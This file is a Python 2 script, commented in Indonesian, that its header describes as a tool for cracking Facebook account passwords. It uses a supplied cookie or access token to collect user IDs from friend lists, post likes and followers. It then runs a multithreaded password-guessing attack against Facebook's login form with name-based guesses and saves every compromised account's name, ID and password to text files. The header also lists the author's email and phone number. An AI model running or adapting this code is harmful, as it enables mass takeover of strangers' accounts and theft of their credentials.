# Tools untuk crack password akun Facebook secara random
# creator EROR504
# email : eror2434@gmail.com
# whatsapp : +6281210160358
# Facebook : https://www.facebook.com/profile.php?id=100049013916432
# instagram : tidak ada
# tiktok : gk maen tiktok
# YouTube : https://youtube.com/channel/UCNUDRE4A2c9689yKdHkmKQA
# Intinya ini cuma buat senang-senang aja ya gan
import os
from os import mkdir as make
from os import system as os
import sys
from sys import exit as keluar
import time
from time import sleep as waktu
try:
    import requests
except ImportError:
    os('pip2 install requests && python2 smp.py')
from requests.exceptions import ConnectionError as galat
from requests import get as rg
from requests import post as rp
import json
import threading
from multiprocessing.pool import ThreadPool as th
import re
logo = '\n\n\x1b[00m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\x1b[00m          \xe2\x95\x94\xe2\x95\x97 \x1b[00m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\x1b[00m        \xe2\x95\x94\xe2\x95\x97\n\x1b[00m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\x1b[00mWISDOM  \x1b[00m\xe2\x95\x91\xe2\x95\x91 \x1b[00m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\x1b[00m        \xe2\x95\x91\xe2\x95\x91\n\x1b[00m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\x1b[00m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \x1b[00m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\x1b[00m\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\n\x1b[00m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\x1b[00m\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \x1b[00m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\x1b[00m\xe2\x95\x91\xe2\x95\x94\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9d\n\x1b[00m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\x1b[00m\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x97\x1b[00m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\x1b[00m\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x97\n\x1b[00m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[00m\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x9d\x1b[00m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[00m\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\n\x1b[00m         \x1b[00m\xe2\x95\x91\xe2\x95\x91 \x1b[00mWHATSAPP \x1b[00m: \x1b[00m09031892511\n\x1b[00m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[00m\xe2\x95\x9a\xe2\x95\x9d\x1b[00m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80>\n\x1b[00m trap \x1b[00mCRTL\x1b[00m +\x1b[00m Z\x1b[00m for close +_(+)\n\x1b[00m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80>'
id = []
crack = []
ok = []
cp = []

nb= 'Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]'
def login():
    try:
        token = open('token.txt','r').read()
        menu()
    except IOError:
        os('clear')
        print logo
        print
        print '1. Login cokies'
        print '2. Login token'
        print '3. Exit'
        print
        log()
def log():
    p = raw_input('\x1b[00m\xe2\x94\x80> ')
    if p == '1':
        waktu(2)
        os('clear')
        print logo
        print
        cok = raw_input('\x1b[00mInput Cookie : ')
        if 'datr=' not in cok:
            print '\x1b[00m! masukkan Cookie yang valid'
            waktu(2)
            login()
        try:
            coki = rg('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cok}).text
            data = re.search('(EAAA\\w+)', coki)
            if data is None:
                print '\x1b[00m! Cookie Tidak valid'
                waktu(2)
                login()
            elif data is not None:
                open('token.txt','w').write(data.group(1))
                print "\x1b[92m! Cookie valid"
                waktu(2)
                menu()
        except galat:
            exit('\x1b[00m! Tidak ada koneksi')
    elif p == '2':
        os('clear')
        print logo
        print
        tok = raw_input('\x1b[00mInput Token : ')
        if 'EAAA' not in tok:
            print '\x1b[00m! Input Token yang valid'
            waktu(2)
            login()
        try:
            token = rg('https://graph.facebook.com/me?access_token=' + tok).json()
            token['name']
        except KeyError:
            print '\x1b[00m! Token Invalid'
            waktu(2)
            login()
        except galat:
            exit('\x1b[00m! Tidak ada koneksi')
        open('token.txt','w').write(tok)
        print '\x1b[92m! Token valid'
        waktu(2)
        menu()
    elif p == '3':
        exit()
    else:
        print '\n\x1b[93m! Input yang bener dong sayang\n'
        log()
def menu():
    global ip
    global daerah
    try:
        ip = rg('https://api.ipify.org').text
    except KeyError:
        pass
    except galat:
        exit('[!] Gk ada koneksi sayang')
    global token
    global pengguna
    global ids
    try:
        token = open('token.txt','r').read()
    except IOError:
        login()
    try:
        data = rg('https://graph.facebook.com/me?access_token=' + token).json()
        pengguna = data['name']
        ids = data['id']
    except KeyError:
        print "\x1b[93mAkun kamu kayaknya kena Cp sayang"
        os('rm -fr token.txt')
        waktu(2)
        login()
    except galat:
        exit("Tidak ada koneksi Internet")
    os('clear')
    print logo
    print "user    : " + pengguna
    print "Id      : " + ids
    print "Ip      : " + ip
    print 35 * '\x1b[00m\xe2\x94\x80' + '>'
    print "1. crack dari daftar teman"
    print "2. crack dari daftar teman orang lain"
    print "3. crack dari postingan Teman"
    print "4. crack dari file id"
    print "5. crack dari total folowers publik"
    print "6. Logout"
    print "0. exit tools"
    print
    pilih_menu()

def pilih_menu():
    p = raw_input('\xe2\x94\x80> ')
    if p == '1':
        try:
            get = rg('https://graph.facebook.com/me/friends?access_token=' + token).json()
        except galat:
            exit("! Tidak ada koneksi Internet")
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '2':
        os('clear')
        print logo
        print
        idt = raw_input('+ Input Id Publik : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()
        except KeyError:
            print "! Id Tidak valid"
            waktu(2)
            menu()
        except galat:
            exit("! Tidak ada koneksi Internet")
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
        try:
            get = rg('https://graph.facebook.com/' + idt + '?access_token=' + token).json()
            us = get['name']
            paw = get['id']
        except galat:
            exit("! Tidak ada koneksi")
        os('clear')
        print logo
        print "Id       : " + paw
        print "Nama     : " + us

    elif p == '3':
        os('clear')
        print logo
        print
        idt = raw_input('+ Input Id postingan : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token).json()
        except KeyError:
            print "\n! Id postingan Tidak valid\n"
            waktu(3)
            menu()
        except galat:
            exit('! Tidak ada koneksi Internet')
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '4':
        os('clear')
        print logo
        print
        idt = raw_input('+ Input File id : ')
        try:
            for line in open(idt,'r').readlines():
                id.append(line.strip())
        except IOError:
            print "\n! File id tidak ada\n"
            waktu(3)
            menu()
    elif p == '5':
        os('clear')
        print logo
        print
        idt = raw_input('+ Input Id Publik : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token).json()
        except KeyError:
            print "\n! Pengguna Tidak Ditemukan\n"
            waktu(3)
            menu()
        except galat:
            exit('! Tidak Ada koneksi')
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
        try:
            get = rg('https://graph.facebook.com/' + idt + '?access_token=' + token).json()
            us = get['name']
            paw = get['id']
        except galat:
            exit("! Tidak ada koneksi")
        os('clear')
        print logo
        print "Id       : " + paw
        print "Nama     : " + us
    elif p == '6':
        os('rm -fr token.txt')
        waktu(2)
        login()
    elif p == '0':
        exit('\n! Lopyu all\n!Jangan lupa subrek YouTube aing slur\n')
    else:
        print "\n! Input yang bener dong sayang\n"
        pilih_menu()

    print "Total Id : " + str(len(id))
    print "Proses crack sudah dimulai"
    print 35 * '\x1b[00m\xe2\x94\x80' + '>'

    def main(arg):
        user = arg
        try:
            make('out')
        except OSError:
            pass
        try:
            get = rg('https://graph.facebook.com/' + user + '/?access_token=' + token).json()
            url = get['link']
            nik = get['name']
            pz1 = get['first_name'].lower() + get['last_name'].lower()
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz1, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz1
                open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz1 + '\nprofile : ' + url + '\n')
                ok.append(user)
            elif 'checkpoint' in data:
                print "\x1b[93mId : " + user + " | Password : " + pz1
                open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz1 + '\nprofile : ' + url + '\n')
                cp.append(user)
            pz2 = get['first_name'].lower() + '12345678'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz2
                open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz2 + '\nprofile : ' + url + '\n')
                ok.append(user)
            elif 'Wisdom_CP' in data:
                print "\x1b[93mId : " + user + " | Password : " + pz2
                open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz2 + '\nprofile : ' + url + '\n')
                cp.append(user)
            pz3 = get['first_name'].lower() + '1234'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                    print "\x1b[92mId : " + user + " | Password : " + pz3
                    open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz3 + '\nprofile : ' + url + '\n')
                    ok.append(user)
            elif 'Wisdom_Cp' in data:
                    print "\x1b[93mId : " + user + " | Password : " + pz3
                    open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz3 + '\nprofile : ' + url + '\n')
                    cp.append(user)
            pz4 = get['first_name'].lower() + '12'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                    print "\x1b[92mId : " + user + " | Password : " + pz4
                    open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz4 + '\nprofile : ' + url + '\n')
                    ok.append(user)
            elif 'Wisdom_Cp' in data:
                    print "\x1b[93mId : " + user + " | Password : " + pz4
                    open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz4 + '\nprofile : ' + url + '\n')
                    cp.append(user)
            pz5 = get['first_name'].lower() + '123'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz5
                open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz5 + '\nprofile : ' + url + '\n')
                ok.append(user)
            elif 'Wisdom_Cp' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz5
                 open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz5 + '\nprofile : ' + url + '\n')
                 cp.append(user)
            pz6 = get['first_name'].lower() + '12345'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz6, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                 print "\x1b[92mId : " + user + " | Password : " + pz6
                 open('out/ok.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz6 + '\nprofile : ' + url + '\n')
                 ok.append(user)
            elif 'Wisdom_Cp' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz6
                 open('out/cp.txt','a').write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz6 + '\nprofile : ' + url + '\n')
                 cp.append(user)
            
        except:
            pass
    p = th(40)
    p.map(main, id)
    print 35 * '\x1b[00m\xe2\x94\x80' + '>'
    print "\x1b[00m!\x1b[97m proses crack selesai"
    if str(len(ok)) == '':
        pass
    else:
        print "\x1b[00m!\x1b[97m Hasil crack aktif tersimpan out/ok.txt"
    if str(len(cp)) == '':
        pass
    else:
        print "\x1b[00m!\x1b[97m Hasil crack checkpoint tersimpan out/cp.txt"
    try:
        io = open('id.txt','r').read()
        print "\x1b[00m!\x1b[97m Data id kami simpan di file id.txt"
    except IOError:
        pass
    menu()
if __name__ == '__main__':
    login()
